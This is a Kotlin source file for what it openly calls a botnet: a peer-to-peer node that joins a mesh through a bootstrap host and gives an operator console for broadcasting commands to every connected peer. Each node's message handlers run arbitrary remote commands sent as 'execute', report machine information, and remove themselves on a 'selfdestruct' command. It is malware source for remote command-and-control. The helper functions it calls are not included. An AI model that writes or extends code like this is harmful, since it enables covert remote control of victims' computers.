package cc.telepath.rhizome

import fr.rhaz.sockets.*
import org.apache.commons.lang3.RandomStringUtils

lateinit var address: String

fun main(args: Array<String>){
    val localport: Int = (args.elementAtOrNull(2) ?: return).toInt()
    val remoteport: Int = (args.elementAtOrNull(1) ?: return).toInt()
    val nodeName: String = (args.elementAtOrNull(3) ?: return)

    address = args.elementAtOrNull(0) ?: return
    defaultDebug = { cause, msg -> println("$cause: $msg")}

    println("Successfully started")

    var node = NodeStart(localport, address, remoteport, nodeName)

    while(true){
        print("Give me a command: ")
        var command: String = readLine()!!
        if(command == "showConnections"){
            for(c: Connection in node.connectionsByTarget.values){
                println("Node " + c.targetName + " is at " + c.targetAddress)
            }
        }
        if(command.split(" ")[0] == "sendMessage"){
            var messageString: String = command.substring(12)
            for(t: Connection in node.connectionsByTarget.values){
                t.msg("botnet", messageString)
            }
        }
        if(command == "quit"){
            System.exit(0)
        }
    }


}


fun getPeers(node: MultiSocket){
    println(node.peers.size)
}

fun NodeStart(localport: Int, host: String, remoteport: Int, nodeName: String) : MultiSocket{

    val node = multiSocket(
        name = nodeName, port = localport,
        bootstrap = listOf(host + ":" + remoteport)
    )

    node.onMessage { msg -> if(msg["data"].toString().substring(0,7) == "execute"){
        msg("botnet", execute(msg["data"].toString().substring(8)))
    }
    }

    node.onMessage { msg -> if(msg["data"].toString().substring(0,12) == "selfdestruct"){
        println("Removing myself...")
        if(selfDestruct(false)){
            msg("botnet", "I have been removed :3")
        }
    }
    }

    node.onMessage { msg -> if(msg["data"] == "MachineInfo"){
        msg("botnet", machineStats())
    }
    }

    node.onMessage { msg ->
        println("RECEIVED MESSAGE:" + msg) }


    node.accept(true)
    return node
}
